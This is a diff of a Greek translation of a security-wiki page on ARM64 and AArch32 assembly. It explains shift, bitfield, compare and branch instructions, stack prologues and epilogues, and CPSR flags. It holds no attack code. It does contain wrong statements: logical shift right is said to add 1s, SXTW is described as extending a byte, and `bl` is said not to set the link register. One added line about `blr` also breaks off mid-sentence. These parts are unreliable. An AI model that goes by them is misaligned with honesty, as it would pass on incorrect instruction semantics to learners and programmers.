-- **Logical shift right**: Προσθέτει 1s στην αρχή, μετακινώντας τα υπόλοιπα bits προς τα πίσω (διαίρεση διά n φορές το 2 σε unsigned)
-- **Arithmetic shift right**: Όπως το **`lsr`**, αλλά αντί να προσθέτει 0s, αν το most significant bit είναι 1, προστίθενται **1s** (διαίρεση διά n φορές το 2 σε signed)
+- **Logical shift left**: Προσθέτει 0 στο τέλος, μετακινώντας τα υπόλοιπα bits προς τα εμπρός (πολλαπλασιασμός επί n φορές το 2)
+- **Logical shift right**: Προσθέτει 1 στην αρχή, μετακινώντας τα υπόλοιπα bits προς τα πίσω (διαίρεση διά n φορές το 2 σε unsigned)
+- **Arithmetic shift right**: Όπως το **`lsr`**, αλλά αντί να προσθέτει 0 όταν το most significant bit είναι 1, προσθέτει **1** (διαίρεση διά n φορές το 2 σε signed)
 - **Rotate right**: Όπως το **`lsr`**, αλλά ό,τι αφαιρείται από τα δεξιά προστίθεται στα αριστερά
-- **Rotate Right with Extend**: Όπως το **`ror`**, αλλά με το carry flag ως το "most significant bit". Έτσι, το carry flag μετακινείται στο bit 31 και το bit που αφαιρέθηκε μετακινείται στο carry flag.
-- **`bfm`**: **Bit Field Move**, αυτά τα operations **αντιγράφουν bits `0...n`** από μια τιμή και τα τοποθετούν στις θέσεις **`m..m+n`**. Το **`#s`** καθορίζει τη θέση του **αριστερότερου bit** και το **`#r`** το rotate right amount.
+- **Rotate Right with Extend**: Όπως το **`ror`**, αλλά με το carry flag ως το "most significant bit". Έτσι το carry flag μετακινείται στο bit 31 και το bit που αφαιρέθηκε μετακινείται στο carry flag.
+- **`bfm`**: **Bit Field Move**. Αυτές οι operations **αντιγράφουν bits `0...n`** από μια τιμή και τα τοποθετούν στις θέσεις **`m..m+n`**. Το **`#s`** καθορίζει τη θέση του **leftmost bit** και το **`#r`** το **rotate right amount**.
 - Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
 - **Bitfield Extract and Insert:** Αντιγράφει ένα bitfield από ένα register και το αντιγράφει σε άλλο register.
-- **`BFI X1, X2, #3, #4`** Εισάγει 4 bits από το X2 ξεκινώντας από το 3ο bit του X1
-- **`BFXIL X1, X2, #3, #4`** Εξάγει τέσσερα bits από το 3ο bit του X2 και τα αντιγράφει στο X1
-- **`SBFIZ X1, X2, #3, #4`** Κάνει sign-extends 4 bits από το X2 και τα εισάγει στο X1 ξεκινώντας από τη θέση bit 3, μηδενίζοντας τα δεξιά bits
-- **`SBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2, κάνει sign extends σε αυτά και τοποθετεί το αποτέλεσμα στο X1
-- **`UBFIZ X1, X2, #3, #4`** Κάνει zero-extends 4 bits από το X2 και τα εισάγει στο X1 ξεκινώντας από τη θέση bit 3, μηδενίζοντας τα δεξιά bits
-- **`UBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2 και τοποθετεί το zero-extended αποτέλεσμα στο X1.
-- **Sign Extend To X:** Επεκτείνει το sign (ή προσθέτει μόνο 0s στην unsigned έκδοση) μιας τιμής, ώστε να είναι δυνατή η εκτέλεση operations με αυτήν:
-- **`SXTB X1, W2`** Επεκτείνει το sign ενός byte **από το W2 στο X1** (`W2` είναι το μισό του `X2`) ώστε να συμπληρωθούν τα 64bits
-- **`SXTH X1, W2`** Επεκτείνει το sign ενός αριθμού 16bit **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
-- **`SXTW X1, W2`** Επεκτείνει το sign ενός byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
-- **`UXTB X1, W2`** Προσθέτει 0s (unsigned) σε ένα byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64bits
+- **`BFI X1, X2, #3, #4`** Εισάγει 4 bits από το X2, ξεκινώντας από το 3ο bit του X1
+- **`BFXIL X1, X2, #3, #4`** Εξάγει 4 bits από το 3ο bit του X2 και τα αντιγράφει στο X1
+- **`SBFIZ X1, X2, #3, #4`** Κάνει sign-extend σε 4 bits από το X2 και τα εισάγει στο X1, ξεκινώντας από τη bit position 3 και μηδενίζοντας τα δεξιά bits
+- **`SBFX X1, X2, #3, #4`** Εξάγει 4 bits που ξεκινούν από το bit 3 του X2, κάνει sign-extend σε αυτά και τοποθετεί το αποτέλεσμα στο X1
+- **`UBFIZ X1, X2, #3, #4`** Κάνει zero-extend σε 4 bits από το X2 και τα εισάγει στο X1, ξεκινώντας από τη bit position 3 και μηδενίζοντας τα δεξιά bits
+- **`UBFX X1, X2, #3, #4`** Εξάγει 4 bits που ξεκινούν από το bit 3 του X2 και τοποθετεί το zero-extended αποτέλεσμα στο X1.
+- **Sign Extend To X:** Επεκτείνει το sign (ή προσθέτει μόνο 0 στην unsigned version) μιας τιμής, ώστε να μπορούν να εκτελεστούν operations με αυτή:
+- **`SXTB X1, W2`** Επεκτείνει το sign ενός byte **από το W2 στο X1** (`W2` είναι το μισό του `X2`) ώστε να συμπληρωθούν τα 64 bits
+- **`SXTH X1, W2`** Επεκτείνει το sign ενός αριθμού 16-bit **από το W2 στο X1** ώστε να συμπληρωθούν τα 64 bits
+- **`SXTW X1, W2`** Επεκτείνει το sign ενός byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64 bits
+- **`UXTB X1, W2`** Προσθέτει 0 (unsigned) σε ένα byte **από το W2 στο X1** ώστε να συμπληρωθούν τα 64 bits
 - **`extr`:** Εξάγει bits από ένα καθορισμένο **ζεύγος concatenated registers**.
-- Example: `EXTR W3, W2, W1, #3` Αυτό κάνει **concat τα W1+W2** και λαμβάνει **από το bit 3 του W2 έως το bit 3 του W1**, αποθηκεύοντάς τα στο W3.
-- **`cmp`**: **Συγκρίνει** δύο registers και θέτει τα condition flags. Είναι **alias του `subs`**, θέτοντας το destination register στο zero register. Χρήσιμο για να ελεγχθεί αν `m == n`.
+- Example: `EXTR W3, W2, W1, #3` Αυτό θα κάνει **concat W1+W2** και θα λάβει **από το bit 3 του W2 έως το bit 3 του W1**, αποθηκεύοντάς το στο W3.
+- **`cmp`**: **Συγκρίνει** δύο registers και ορίζει condition flags. Είναι **alias του `subs`**, ορίζοντας το destination register στο zero register. Χρήσιμο για να διαπιστωθεί αν `m == n`.
 - Υποστηρίζει το **ίδιο syntax με το `subs`**
-- Example: `cmp x0, x1` — Συγκρίνει τις τιμές στα `x0` και `x1` και θέτει ανάλογα τα condition flags.
-- **`cmn`**: **Compare negative** operand. Σε αυτή την περίπτωση είναι **alias του `adds`** και υποστηρίζει το ίδιο syntax. Χρήσιμο για να ελεγχθεί αν `m == -n`.
-- **`ccmp`**: Conditional comparison. Είναι μια σύγκριση που εκτελείται μόνο αν μια προηγούμενη σύγκριση ήταν true και θέτει συγκεκριμένα τα nzcv bits.
-- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> αν x1 != x2 και x3 < x4, jump στο func
-- Αυτό συμβαίνει επειδή το **`ccmp`** εκτελείται μόνο αν το **προηγούμενο `cmp` ήταν `NE`**. Αν δεν ήταν, τα bits `nzcv` τίθενται σε 0 (κάτι που δεν θα ικανοποιήσει τη σύγκριση `blt`).
-- Αυτό μπορεί επίσης να χρησιμοποιηθεί ως `ccmn` (το ίδιο αλλά negative, όπως `cmp` έναντι `cmn`).
-- **`tst`**: Ελέγχει αν οποιεσδήποτε από τις τιμές της σύγκρισης είναι και οι δύο 1 (λειτουργεί όπως ένα ANDS χωρίς να αποθηκεύει το αποτέλεσμα πουθενά). Είναι χρήσιμο για τον έλεγχο ενός register με μια τιμή και για να διαπιστωθεί αν κάποιο από τα bits του register που υποδεικνύονται στην τιμή είναι 1.
-- Example: `tst X1, #7` Ελέγχει αν κάποιο από τα 3 τελευταία bits του X1 είναι 1
+- Example: `cmp x0, x1` — Συγκρίνει τις τιμές στα `x0` και `x1` και ορίζει τα condition flags ανάλογα.
+- **`cmn`**: **Compare negative** operand. Σε αυτή την περίπτωση είναι **alias του `adds`** και υποστηρίζει το ίδιο syntax. Χρήσιμο για να διαπιστωθεί αν `m == -n`.
+- **`ccmp`**: Conditional comparison. Είναι μια σύγκριση που εκτελείται μόνο αν μια προηγούμενη σύγκριση ήταν true και ορίζει συγκεκριμένα τα nzcv bits.
+- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> αν x1 != x2 και x3 < x4, μεταβαίνει στη func
+- Αυτό συμβαίνει επειδή το **`ccmp`** εκτελείται μόνο αν το **προηγούμενο `cmp` ήταν `NE`**. Αν δεν ήταν, τα bits `nzcv` ορίζονται σε 0 (κάτι που δεν θα ικανοποιήσει τη σύγκριση `blt`).
+- Αυτό μπορεί επίσης να χρησιμοποιηθεί ως `ccmn` (ίδιο, αλλά negative, όπως η σχέση `cmp` με `cmn`).
+- **`tst`**: Ελέγχει αν οποιεσδήποτε από τις τιμές της σύγκρισης είναι και οι δύο 1 (λειτουργεί όπως ένα ANDS χωρίς να αποθηκεύει το αποτέλεσμα πουθενά). Είναι χρήσιμο για τον έλεγχο ενός register με μια τιμή και για να διαπιστωθεί αν οποιοδήποτε από τα bits του register που υποδεικνύονται στην τιμή είναι 1.
+- Example: `tst X1, #7` Ελέγχει αν κάποιο από τα τελευταία 3 bits του X1 είναι 1
 - **`teq`**: XOR operation που απορρίπτει το αποτέλεσμα
 - **`b`**: Unconditional Branch
 - Example: `b myFunction`
-- Σημειώστε ότι αυτό δεν θα γεμίσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
-- **`bl`**: **Branch** with link, χρησιμοποιείται για **call** μιας **subroutine**. Αποθηκεύει τη **return address στο `x30`**.
+- Σημειώστε ότι αυτό δεν θα συμπληρώσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
+- **`bl`**: **Branch** with link, χρησιμοποιείται για την **κλήση** μιας **subroutine**. Αποθηκεύει τη **return address στο `x30`**.
 - Example: `bl myFunction` — Καλεί τη function `myFunction` και αποθηκεύει τη return address στο `x30`.
-- Σημειώστε ότι αυτό δεν θα γεμίσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
-- **`blr`**: **Branch** with Link to Register, χρησιμοποιείται για την κλήση μιας **subroutine** όπου ο target **καθορίζεται σε ένα register**. Αποθηκεύει τη return address στο `x30`.
+- Σημειώστε ότι αυτό δεν θα συμπληρώσει το link register με τη return address (δεν είναι κατάλληλο για subroutine calls που πρέπει να επιστρέψουν)
+- **`blr`**: **Branch** with Link to Register, χρησιμοποιείται για την **κλήση** μιας **subroutine** όπου ο target καθορίζεται σε ένα **register**. Αποθηκεύει τη return address στο `x30`. (Αυτό είναι
 - Example: `blr x1` — Καλεί τη function της οποίας η address περιέχεται στο `x1` και αποθηκεύει τη return address στο `x30`.
-- **`ret`**: **Επιστρέφει** από **subroutine**, χρησιμοποιώντας συνήθως τη διεύθυνση στο **`x30`**.
+- **`ret`**: **Επιστρέφει** από **subroutine**, συνήθως χρησιμοποιώντας τη διεύθυνση στο **`x30`**.
 - Example: `ret` — Επιστρέφει από την τρέχουσα subroutine χρησιμοποιώντας τη return address στο `x30`.
 - **`b.<cond>`**: Conditional branches
-- **`b.eq`**: **Branch if equal**, βασισμένο στην προηγούμενη instruction `cmp`.
-- Example: `b.eq label` — Αν η προηγούμενη instruction `cmp` βρήκε δύο ίσες τιμές, μεταβαίνει στο `label`.
-- **`b.ne`**: **Branch if Not Equal**. Αυτή η instruction ελέγχει τα condition flags (που τέθηκαν από προηγούμενη comparison instruction) και, αν οι συγκρινόμενες τιμές δεν ήταν ίσες, κάνει branch σε label ή address.
-- Example: Μετά από μια instruction `cmp x0, x1`, το `b.ne label` — Αν οι τιμές των `x0` και `x1` δεν ήταν ίσες, μεταβαίνει στο `label`.
-- **`cbz`**: **Compare and Branch on Zero**. Αυτή η instruction συγκρίνει ένα register με το zero και, αν είναι ίσα, κάνει branch σε label ή address.
+- **`b.eq`**: **Branch if equal**, με βάση την προηγούμενη `cmp` instruction.
+- Example: `b.eq label` — Αν η προηγούμενη `cmp` instruction βρήκε δύο ίσες τιμές, μεταβαίνει στο `label`.
+- **`b.ne`**: **Branch if Not Equal**. Αυτή η instruction ελέγχει τα condition flags (τα οποία ορίστηκαν από προηγούμενη comparison instruction) και, αν οι συγκρινόμενες τιμές δεν ήταν ίσες, μεταβαίνει σε label ή address.
+- Example: Μετά από μια instruction `cmp x0, x1`, η `b.ne label` — Αν οι τιμές στα `x0` και `x1` δεν ήταν ίσες, μεταβαίνει στο `label`.
+- **`cbz`**: **Compare and Branch on Zero**. Αυτή η instruction συγκρίνει ένα register με το zero και, αν είναι ίσα, μεταβαίνει σε label ή address.
 - Example: `cbz x0, label` — Αν η τιμή στο `x0` είναι zero, μεταβαίνει στο `label`.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. Αυτή η instruction συγκρίνει ένα register με το zero και, αν δεν είναι ίσα, κάνει branch σε label ή address.
+- **`cbnz`**: **Compare and Branch on Non-Zero**. Αυτή η instruction συγκρίνει ένα register με το zero και, αν δεν είναι ίσα, μεταβαίνει σε label ή address.
 - Example: `cbnz x0, label` — Αν η τιμή στο `x0` είναι non-zero, μεταβαίνει στο `label`.
 - **`tbnz`**: Test bit and branch on nonzero
 - Example: `tbnz x0, #8, label`
 - **`tbz`**: Test bit and branch on zero
 - Example: `tbz x0, #8, label`
-- **Conditional select operations**: Πρόκειται για operations των οποίων η συμπεριφορά μεταβάλλεται ανάλογα με τα conditional bits.
+- **Conditional select operations**: Είναι operations των οποίων η συμπεριφορά μεταβάλλεται ανάλογα με τα conditional bits.
 - `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Αν true, X0 = X1, αν false, X0 = X2
 - `csinc Xd, Xn, Xm, cond` -> Αν true, Xd = Xn, αν false, Xd = Xm + 1
 - `cinc Xd, Xn, cond` -> Αν true, Xd = Xn + 1, αν false, Xd = Xn
@@ -219,11 +219,11 @@
 - `csetm Xd, Xn, Xm, cond` -> Αν true, Xd = \<all 1>, αν false, Xd = 0
 - **`adrp`**: Υπολογίζει τη **page address ενός symbol** και την αποθηκεύει σε ένα register.
 - Example: `adrp x0, symbol` — Υπολογίζει τη page address του `symbol` και την αποθηκεύει στο `x0`.
-- **`ldrsw`**: **Φορτώνει** μια signed **32-bit** τιμή από τη memory και κάνει **sign-extend σε 64** bits. Χρησιμοποιείται για συνηθισμένες περιπτώσεις SWITCH.
-- Example: `ldrsw x0, [x1]` — Φορτώνει μια signed 32-bit τιμή από τη memory location στην οποία δείχνει το `x1`, κάνει sign-extend σε 64 bits και την αποθηκεύει στο `x0`.
-- **`stur`**: **Αποθηκεύει μια τιμή register σε memory location**, χρησιμοποιώντας offset από άλλο register.
-- Example: `stur x0, [x1, #4]` — Αποθηκεύει την τιμή στο `x0` στη memory address που είναι κατά 4 bytes μεγαλύτερη από τη διεύθυνση που βρίσκεται αυτή τη στιγμή στο `x1`.
-- **`svc`** : Εκτελεί ένα **system call**. Είναι συντομογραφία του "Supervisor Call". Όταν ο processor εκτελεί αυτή την instruction, **μεταβαίνει από user mode σε kernel mode** και μεταβαίνει σε συγκεκριμένη memory location όπου βρίσκεται ο κώδικας **χειρισμού system calls του kernel**.
+- **`ldrsw`**: **Φορτώνει** μια signed τιμή **32-bit** από τη memory και κάνει **sign-extend σε 64** bits. Χρησιμοποιείται σε συνηθισμένες περιπτώσεις SWITCH.
+- Example: `ldrsw x0, [x1]` — Φορτώνει μια signed 32-bit τιμή από τη memory location που υποδεικνύεται από το `x1`, κάνει sign-extend σε 64 bits και την αποθηκεύει στο `x0`.
+- **`stur`**: **Αποθηκεύει την τιμή ενός register σε memory location**, χρησιμοποιώντας offset από άλλο register.
+- Example: `stur x0, [x1, #4]` — Αποθηκεύει την τιμή του `x0` στη memory address που είναι 4 bytes μεγαλύτερη από την address που βρίσκεται τώρα στο `x1`.
+- **`svc`** : Εκτελεί ένα **system call**. Σημαίνει "Supervisor Call". Όταν ο processor εκτελεί αυτή την instruction, **μεταβαίνει από user mode σε kernel mode** και μεταφέρεται σε συγκεκριμένη memory location όπου βρίσκεται ο κώδικας **διαχείρισης system calls του kernel**.
 
 - Example:
 
@@ -239,32 +239,32 @@ svc 0       ; Make the system call.
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **Ρύθμιση του νέου frame pointer**: `mov x29, sp` (ρυθμίζει τον νέο frame pointer για την τρέχουσα function)
-3. **Δέσμευση χώρου στο stack για local variables** (αν χρειάζεται): `sub sp, sp, <size>` (όπου το `<size>` είναι ο αριθμός των απαιτούμενων bytes)
+2. **Ρύθμιση του νέου frame pointer**: `mov x29, sp` (ρυθμίζει τον νέο frame pointer για την τρέχουσα συνάρτηση)
+3. **Δέσμευση χώρου στη stack για τοπικές μεταβλητές** (αν χρειάζεται): `sub sp, sp, <size>` (όπου το `<size>` είναι ο αριθμός των απαιτούμενων bytes)
 
-### **Επίλογος της function**
+### **Επίλογος συνάρτησης**
 
-1. **Αποδέσμευση των local variables** (αν είχαν δεσμευτεί): `add sp, sp, <size>`
+1. **Αποδέσμευση των τοπικών μεταβλητών (αν είχαν δεσμευτεί)**: `add sp, sp, <size>`
 2. **Επαναφορά του link register και του frame pointer**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
-3. **Return**: `ret` (επιστρέφει τον έλεγχο στον caller χρησιμοποιώντας τη διεύθυνση στο link register)
+3. **Return**: `ret` (επιστρέφει τον έλεγχο στον caller χρησιμοποιώντας τη διεύθυνση του link register)
 
-## Κοινές Προστασίες Μνήμης ARM
+## Κοινές Memory Protections του ARM
 
 {{#ref}}
 ../../../binary-exploitation/ios-exploiting/README.md
 {{#endref}}
 
-## Κατάσταση Εκτέλεσης AARCH32
+## Κατάσταση εκτέλεσης AARCH32
 
-Το Armv8-A υποστηρίζει την εκτέλεση προγραμμάτων 32-bit. Το **AArch32** μπορεί να εκτελείται σε ένα από δύο **instruction sets**: **`A32`** και **`T32`**, και μπορεί να εναλλάσσεται μεταξύ τους μέσω του **`interworking`**.\
-**Privileged** προγράμματα 64-bit μπορούν να προγραμματίσουν την **εκτέλεση προγραμμάτων 32-bit** εκτελώντας μια μεταφορά exception level στο χαμηλότερο privileged 32-bit επίπεδο.\
-Σημειώστε ότι η μετάβαση από 64-bit σε 32-bit πραγματοποιείται με μείωση του exception level (για παράδειγμα, ένα πρόγραμμα 64-bit στο EL1 ενεργοποιεί ένα πρόγραμμα στο EL0). Αυτό γίνεται ορίζοντας το **bit 4 του** ειδικού register **`SPSR_ELx`** **σε 1** όταν το thread της διεργασίας **AArch32** είναι έτοιμο να εκτελεστεί, ενώ το υπόλοιπο του `SPSR_ELx` αποθηκεύει το CPSR του προγράμματος **`AArch32`**. Στη συνέχεια, η privileged διεργασία καλεί την εντολή **`ERET`**, ώστε ο processor να μεταβεί στο **`AArch32`**, εισερχόμενος σε A32 ή T32 ανάλογα με το CPSR**.**
+Το Armv8-A υποστηρίζει την εκτέλεση προγραμμάτων 32-bit. Το **AArch32** μπορεί να εκτελεστεί σε ένα από δύο **instruction sets**: **`A32`** και **`T32`**, και μπορεί να πραγματοποιεί εναλλαγή μεταξύ τους μέσω του **`interworking`**.\
+Τα **Privileged** προγράμματα 64-bit μπορούν να προγραμματίσουν την **εκτέλεση προγραμμάτων 32-bit**, εκτελώντας μια μεταφορά exception level στο χαμηλότερο privileged 32-bit επίπεδο.\
+Σημειώστε ότι η μετάβαση από 64-bit σε 32-bit πραγματοποιείται με μείωση του exception level (για παράδειγμα, ένα πρόγραμμα 64-bit στο EL1 ενεργοποιεί ένα πρόγραμμα στο EL0). Αυτό γίνεται θέτοντας το **bit 4 του** ειδικού register **`SPSR_ELx`** **σε 1**, όταν το thread της διεργασίας **`AArch32`** είναι έτοιμο να εκτελεστεί, ενώ το υπόλοιπο του `SPSR_ELx` αποθηκεύει το CPSR του προγράμματος **`AArch32`**. Στη συνέχεια, η privileged διεργασία καλεί την εντολή **`ERET`**, ώστε ο processor να μεταβεί σε **`AArch32`**, εισερχόμενος σε A32 ή T32, ανάλογα με το CPSR**.**
 
-Το **`interworking`** πραγματοποιείται χρησιμοποιώντας τα J και T bits του CPSR. `J=0` και `T=0` σημαίνει **`A32`**, ενώ `J=0` και `T=1` σημαίνει **T32**. Αυτό ουσιαστικά μεταφράζεται στον ορισμό του **χαμηλότερου bit σε 1**, ώστε να υποδεικνύεται ότι το instruction set είναι T32.\
-Αυτό ορίζεται κατά τη διάρκεια των **interworking branch instructions,** αλλά μπορεί επίσης να οριστεί απευθείας με άλλες εντολές όταν το PC ορίζεται ως destination register. Παράδειγμα:
+Το **`interworking`** πραγματοποιείται χρησιμοποιώντας τα J και T bits του CPSR. `J=0` και `T=0` σημαίνει **`A32`**, ενώ `J=0` και `T=1` σημαίνει **T32**. Αυτό ουσιαστικά μεταφράζεται στη ρύθμιση του **χαμηλότερου bit σε 1**, ώστε να υποδεικνύεται ότι το instruction set είναι T32.\
+Αυτό ορίζεται κατά τη διάρκεια των **interworking branch instructions**, αλλά μπορεί επίσης να οριστεί απευθείας με άλλες instructions, όταν το PC έχει οριστεί ως destination register. Παράδειγμα:
 
 Ένα ακόμη παράδειγμα:
 ```armasm
@@ -279,48 +279,48 @@ mov r0, #8
 ```
 ### Registers
 
-Υπάρχουν 16 registers των 32-bit (r0-r15). **Από το r0 έως το r14** μπορούν να χρησιμοποιηθούν για **οποιαδήποτε operation**, ωστόσο ορισμένα από αυτά συνήθως δεσμεύονται:
+Υπάρχουν 16 registers των 32 bit (`r0-r15`). **Από το r0 έως το r14** μπορούν να χρησιμοποιηθούν για **οποιαδήποτε operation**, ωστόσο ορισμένα από αυτά συνήθως δεσμεύονται:
 
-- **`r15`**: Program counter (πάντα). Περιέχει τη διεύθυνση της επόμενης instruction. Στο A32 είναι current + 8, ενώ στο T32 current + 4.
+- **`r15`**: Program counter (πάντα). Περιέχει τη διεύθυνση της επόμενης instruction. Στο A32, current + 8, ενώ στο T32, current + 4.
 - **`r11`**: Frame Pointer
 - **`r12`**: Intra-procedural call register
-- **`r13`**: Stack Pointer (Σημειώστε ότι το stack είναι πάντα aligned σε όριο 16-byte)
+- **`r13`**: Stack Pointer (Σημειώστε ότι το stack είναι πάντα ευθυγραμμισμένο στα 16-byte)
 - **`r14`**: Link Register
 
-Επιπλέον, τα registers υποστηρίζονται από **`banked registries`**. Πρόκειται για θέσεις που αποθηκεύουν τις τιμές των registers, επιτρέποντας **fast context switching** κατά τον χειρισμό exceptions και σε privileged operations, ώστε να αποφεύγεται η ανάγκη χειροκίνητης αποθήκευσης και επαναφοράς των registers κάθε φορά.\
-Αυτό γίνεται με **saving του processor state από το `CPSR` στο `SPSR`** του processor mode στο οποίο μεταφέρεται η exception. Κατά την επιστροφή από την exception, το **`CPSR`** επαναφέρεται από το **`SPSR`**.
+Επιπλέον, τα registers υποστηρίζονται από **`banked registries`**. Πρόκειται για θέσεις που αποθηκεύουν τις τιμές των registers, επιτρέποντας **fast context switching** κατά τον χειρισμό εξαιρέσεων και τις privileged operations, ώστε να αποφεύγεται η ανάγκη χειροκίνητης αποθήκευσης και επαναφοράς των registers κάθε φορά.\
+Αυτό γίνεται με την **αποθήκευση της κατάστασης του processor από το `CPSR` στο `SPSR`** του processor mode στον οποίο μεταφέρεται η exception. Κατά την επιστροφή από την exception, το **`CPSR`** επαναφέρεται από το **`SPSR`**.
 
 ### CPSR - Current Program Status Register
 
-Στο AArch32 το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στο AArch64 και επίσης αποθηκεύεται στο **`SPSR_ELx`** όταν λαμβάνει χώρα μια exception, ώστε να επαναφερθεί αργότερα η execution:
+Στο AArch32 το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στο AArch64 και επίσης αποθηκεύεται στο **`SPSR_ELx`** όταν λαμβάνει χώρα μια exception, ώστε να επαναφερθεί αργότερα η εκτέλεση:
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
 Τα fields χωρίζονται σε ορισμένες ομάδες:
 
 - Application Program Status Register (APSR): Arithmetic flags, προσβάσιμα από το EL0
-- Execution State Registers: Συμπεριφορά της process (managed από το OS).
+- Execution State Registers: Συμπεριφορά του process (υπό τη διαχείριση του OS).
 
 #### Application Program Status Register (APSR)
 
-- Τα flags **`N`**, **`Z`**, **`C`**, **`V`** (όπως και στο AArch64)
-- Το flag **`Q`**: Ορίζεται σε 1 κάθε φορά που λαμβάνει χώρα **integer saturation** κατά την εκτέλεση μιας specialized saturating arithmetic instruction. Μόλις οριστεί σε **`1`**, διατηρεί την τιμή του μέχρι να οριστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει instruction που να ελέγχει implicit την τιμή του· αυτό πρέπει να γίνει με χειροκίνητη ανάγνωσή του.
-- Flags **`GE`** (Greater than or equal): Χρησιμοποιούνται σε SIMD (Single Instruction, Multiple Data) operations, όπως τα "parallel add" και "parallel subtract". Αυτές οι operations επιτρέπουν την επεξεργασία πολλαπλών data points σε μία instruction.
+- Τα flags **`N`**, **`Z`**, **`C`**, **`V`** (όπως ακριβώς στο AArch64)
+- Το flag **`Q`**: Ορίζεται σε 1 κάθε φορά που συμβαίνει **integer saturation** κατά την εκτέλεση μιας specialized saturating arithmetic instruction. Μόλις οριστεί σε **`1`**, διατηρεί την τιμή του μέχρι να οριστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει instruction που να ελέγχει έμμεσα την τιμή του· αυτό πρέπει να γίνει διαβάζοντάς την χειροκίνητα.
+- Τα flags **`GE`** (Greater than or equal): Χρησιμοποιούνται σε SIMD (Single Instruction, Multiple Data) operations, όπως τα "parallel add" και "parallel subtract". Αυτές οι operations επιτρέπουν την επεξεργασία πολλαπλών data points σε μία instruction.
 
-Για παράδειγμα, η instruction **`UADD8`** **προσθέτει τέσσερα ζεύγη bytes** (από δύο operands των 32-bit) παράλληλα και αποθηκεύει τα αποτελέσματα σε ένα register των 32-bit. Στη συνέχεια, **ορίζει τα flags `GE` στο `APSR`** με βάση αυτά τα αποτελέσματα. Κάθε flag GE αντιστοιχεί σε μία από τις προσθέσεις bytes και υποδεικνύει αν η πρόσθεση για το συγκεκριμένο ζεύγος bytes **προκάλεσε overflow**.
+Για παράδειγμα, η instruction **`UADD8`** **προσθέτει τέσσερα ζεύγη bytes** (από δύο operands των 32 bit) παράλληλα και αποθηκεύει τα αποτελέσματα σε ένα register των 32 bit. Στη συνέχεια **ορίζει τα flags `GE` στο `APSR`** με βάση αυτά τα αποτελέσματα. Κάθε flag GE αντιστοιχεί σε μία από τις προσθέσεις bytes και υποδεικνύει αν η πρόσθεση για το συγκεκριμένο ζεύγος bytes **προκάλεσε overflow**.
 
 Η instruction **`SEL`** χρησιμοποιεί αυτά τα flags GE για την εκτέλεση conditional actions.
 
 #### Execution State Registers
 
-- Τα bits **`J`** και **`T`**: Το **`J`** πρέπει να είναι 0 και, αν το **`T`** είναι 0, χρησιμοποιείται το instruction set A32, ενώ αν είναι 1 χρησιμοποιείται το T32.
-- **IT Block State Register** (`ITSTATE`): Αυτά είναι τα bits από τα 10-15 και 25-26. Αποθηκεύουν conditions για instructions μέσα σε μια ομάδα με prefix **`IT`**.
-- Bit **`E`**: Υποδεικνύει το **endianness**.
-- **Mode and Exception Mask Bits** (0-4): Καθορίζουν το τρέχον execution state. Το **5ο** από αυτά υποδεικνύει αν το πρόγραμμα εκτελείται ως 32bit (τιμή 1) ή 64bit (τιμή 0). Τα άλλα 4 αντιπροσωπεύουν το **exception mode** που χρησιμοποιείται τη δεδομένη στιγμή (όταν λαμβάνει χώρα μια exception και γίνεται ο χειρισμός της). Ο αριθμός που έχει οριστεί **υποδεικνύει την τρέχουσα προτεραιότητα** σε περίπτωση που ενεργοποιηθεί άλλη exception όσο γίνεται ο χειρισμός αυτής.
+- Τα bits **`J`** και **`T`**: Το **`J`** πρέπει να είναι 0 και, αν το **`T`** είναι 0, χρησιμοποιείται το instruction set A32, ενώ αν είναι 1, χρησιμοποιείται το T32.
+- **IT Block State Register** (`ITSTATE`): Πρόκειται για τα bits από 10-15 και 25-26. Αποθηκεύουν conditions για instructions μέσα σε μια ομάδα με prefix **`IT`**.
+- Το bit **`E`**: Υποδεικνύει το **endianness**.
+- **Mode and Exception Mask Bits** (0-4): Καθορίζουν την τρέχουσα κατάσταση εκτέλεσης. Το 5ο από αυτά υποδεικνύει αν το πρόγραμμα εκτελείται ως 32bit (τιμή 1) ή ως 64bit (τιμή 0). Τα άλλα 4 αντιπροσωπεύουν το exception mode που χρησιμοποιείται αυτήν τη στιγμή (όταν συμβαίνει μια exception και γίνεται ο χειρισμός της). Ο αριθμός που έχει οριστεί **υποδεικνύει την τρέχουσα προτεραιότητα** σε περίπτωση που ενεργοποιηθεί άλλη exception ενώ η παρούσα γίνεται η διαχείρισή της.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Ορισμένες exceptions μπορούν να απενεργοποιηθούν χρησιμοποιώντας τα bits **`A`**, `I`, `F`. Αν το **`A`** είναι 1, σημαίνει ότι θα ενεργοποιούνται **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε εξωτερικά hardware **Interrupts Requests** (IRQs), ενώ το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
